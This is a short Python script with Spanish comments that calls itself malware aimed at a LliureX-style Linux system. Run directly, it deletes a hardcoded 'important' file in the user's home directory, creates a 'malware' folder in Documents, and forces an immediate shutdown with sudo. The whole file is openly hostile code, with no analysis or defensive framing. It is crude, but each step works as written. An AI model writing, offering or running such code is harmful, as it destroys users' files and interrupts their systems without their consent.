import os
import time

def lliurex_malware():
    print("Este programa es malicioso y va a causar daño en tu sistema.")

    # Borramos archivos importantes
    archivo_a_borrar = "/home/user/archivo_important.txt"
    if os.path.exists(archivo_a_borrar):
        os.remove(archivo_a_borrar)
        print("Archivo eliminado con éxito")

    # Crea una carpeta llamada "malware" en la carpeta de documentos
    carpeta_malware = "/home/user/Documents/malware"
    if not os.path.exists(carpeta_malware):
        os.mkdir(carpeta_malware)
        print("Carpeta creada con éxito")

    # Ejecuta un comando de sistema
    comando = "sudo shutdown -h now"
    os.system(comando)
    print("Sistema apagándose")

    # Esporádico: espera 5 segundos antes de continuar
    time.sleep(5)

    print("Fin del programa malicioso")

lliurex_malware()
